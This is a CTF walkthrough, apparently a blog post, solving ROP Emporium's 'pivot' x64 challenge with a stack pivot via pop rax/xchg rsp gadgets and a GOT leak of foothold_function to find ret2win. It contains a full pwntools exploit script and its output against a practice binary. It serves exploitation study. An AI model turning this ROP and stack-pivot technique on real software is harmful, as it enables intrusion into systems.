---
title: "Pivot (x64)"
date: "2025-08-12"
tags: ["RopEmporium", "ROP", "stack pivot"]
---

In this exercise they give us a binary and a libc again.

```c
pwndbg> checksec
File:     /home/ub1cu0/Desktop/ropEmporium/pivot/pivot
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

The binary lets us enter 2 values:

```c
./pivot 
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f89e0608f10
Send a ROP chain now and it will land there
> hola
Thank you!

Now please send your stack smash
> adios
Thank you!

Exiting
```

Let's see what that looks like from `ghidra`:

```c
void pwnme(void *puntero) {
    char array[32];

    memset(array, 0, 0x20);
    puts("Call ret2win() from libpivot");
    printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", puntero);
    puts("Send a ROP chain now and it will land there");
    printf("> ");
    read(0, puntero, 0x100);
    puts("Thank you!\n");
    puts("Now please send your stack smash");
    printf("> ");
    read(0, array, 0x40);
    puts("Thank you!");
    return;
}
```

As we can see, we have a buffer overflow with 32 bytes to spare in the second value they ask for. We can also see that the first value gets stored in `puntero`. Let's look at where that pointer comes from:

```c
void pwnme(void *puntero);

int main(void) {
    void *ptr;

    setvbuf(stdout, NULL, _IONBF, 0);  // Sin buffer en stdout
    puts("pivot by ROP Emporium");
    puts("x86_64\n");

    ptr = malloc(0x10000000);
    if (ptr == NULL) {
        puts("Failed to request space for pivot stack");
        exit(1);
    }

    // Llamar a pwnme con un puntero adelantado (offset 0xffff00)
    pwnme((char *)ptr + 0xffff00);

    free(ptr);
    puts("\nExiting");

    return 0;
}
```

The program allocates a big chunk of space and the pointer is the start of that space plus a large value, so it points to a zone far up inside the allocation.

Now that we know this we can do a stack pivot. If we get rsp to point at that pointer we get room for a very long rop chain.

To do that let's look for an interesting gadget that lets us manipulate rsp:

```c
0x004009bb : pop rax ; ret
. . .
0x004009bd : xchg rsp, rax ; ret
```

Chaining these 2 gadgets we control rsp at will. As we saw in the code of the `pwnme` function, the program prints the value of the pointer on screen, so with that we have everything we need for the stack pivot:

```python
io.recvlines(4)
pivot_addr = int(io.recvline().decode().strip().split(': ')[1], 16)

stack_pivoting = flat({
    offset: [
        pop_rax, pivot_addr,
        xchg_rsp_rax
    ]
})
```

With that payload whatever we put in the first input runs once the buffer overflow happens. So we go from 32 bytes of rop chain to a lot more.

Now that we have more space we can try to get the flag. Looking at the libc we can see there is a win function that prints it:

```c
void ret2win(void) {
    FILE *stream = fopen("flag.txt", "r");
    if (!stream) {
        puts("Failed to open file: flag.txt");
        exit(1);
    }

    char buf[0x21];
    fgets(buf, sizeof(buf), stream);
    puts(buf);

    fclose(stream);
    exit(0);
}
```

To get the address we could try leaking puts with puts, but the libc that has the `ret2win` function does not have puts. The binary does. Looking at more functions in the libc we find this one:

```c
void foothold_function(void) {
    puts("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot");
}
```

The thing is that function has never been called, so it is not resolved in the `got` yet and we cannot read its address. What we have to do is call it ourselves with our rop chain, so the address gets written into the `got`. For that we need `foothold_function` to be in the `plt` of our binary. Let's check:

```c
00000000004009a8 <uselessFunction>:
  4009a8:	55                   	push   rbp
  4009a9:	48 89 e5             	mov    rbp,rsp
  4009ac:	e8 6f fd ff ff       	call   400720 <foothold_function@plt>
  4009b1:	bf 01 00 00 00       	mov    edi,0x1
  4009b6:	e8 95 fd ff ff       	call   400750 <exit@plt>
```

It is there! So we can leak that function with puts and do the math to get the libc address, and from there the address of the libc function `ret2win`. Let's go with the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./pivot")
libc = ELF("./libpivot.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b ret2win
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()

    offset = 40
    pop_rdi = 0x00400a33 # pop rdi ; ret
    pop_rax = 0x004009bb # pop rax ; ret
    xchg_rsp_rax = 0x004009bd # xchg rsp, rax ; ret
    ret = 0x004006b6 # ret
    
    io.recvlines(4)
    pivot_addr = int(io.recvline().decode().strip().split(': ')[1], 16)
    
    log.success(f'Pivot Address: {hex(pivot_addr)}')
    
    payload1 = flat(
        exe.plt['foothold_function'],
        pop_rdi, exe.got['foothold_function'],
        exe.plt['puts'],
        exe.sym['pwnme'],
        exe.sym['main'], # Instrucción necesaria para que no reviente el exploit
    )
    
    payload2 = flat({
        offset: [
            pop_rax, pivot_addr,
            xchg_rsp_rax
        ]
    })
    
    io.sendlineafter(b'> ', payload1)
    io.sendlineafter(b'> ', payload2)
    
    io.recvlines(2)
    leak = u64(io.recvline().rstrip(b'\n').ljust(8, b'\x00')) # Guardamos el Leak
    log.success(f'Leak: {hex(leak)}')
    
    libc.address = leak - libc.sym['foothold_function'] # Calculamos la dirección base de la libc
    log.success(f'Libc Address: {hex(libc.address)}')
    
    info(f'Ret2win: {hex(libc.symbols['ret2win'])}')
    
    io.sendlineafter(b'> ', b'B' * 8) # La he liado al contar lineas o algo y me hace falta repetir esta linea
    io.sendlineafter(b'> ', b'B' * 8)
    io.sendlineafter(b'> ', b'B' * offset + p64(libc.symbols['ret2win']))
    
    io.interactive()

if __name__ == "__main__":
    main()

```

```c
[+] Starting local process '/home/ub1cu0/Desktop/ropEmporium/pivot/pivot': pid 218429
[+] Pivot Address: 0x7f916cc08f10
[+] Leak: 0x7f916ce0096a
[+] Libc Address: 0x7f916ce00000
[*] Ret2win: 0x7f916ce00a81
[*] Switching to interactive mode
Thank you!

Now please send your stack smash
> [*] Process '/home/ub1cu0/Desktop/ropEmporium/pivot/pivot' stopped with exit code 0 (pid 218429)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

It works! Thanks for reading.
